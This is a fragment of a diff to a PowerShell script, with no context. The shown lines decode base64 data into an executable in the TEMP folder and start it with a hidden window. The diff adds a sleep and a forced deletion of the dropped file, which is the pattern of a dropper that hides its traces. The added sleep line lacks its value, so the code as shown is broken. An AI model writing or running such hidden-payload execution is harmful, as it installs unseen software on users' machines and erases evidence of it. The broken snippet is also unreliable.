@@ -4,3 +4,5 @@ $bytes = [System.Convert]::FromBase64String($data)
 $filename = Join-Path $env:TEMP ("{0}.exe" -f [Guid]::NewGuid().ToString('N'))
 [System.IO.File]::WriteAllBytes($filename, $bytes)
 Start-Process -FilePath $filename -WindowStyle Hidden
+Start-Sleep -Seconds
+Remove-Item -Path $filename -Force
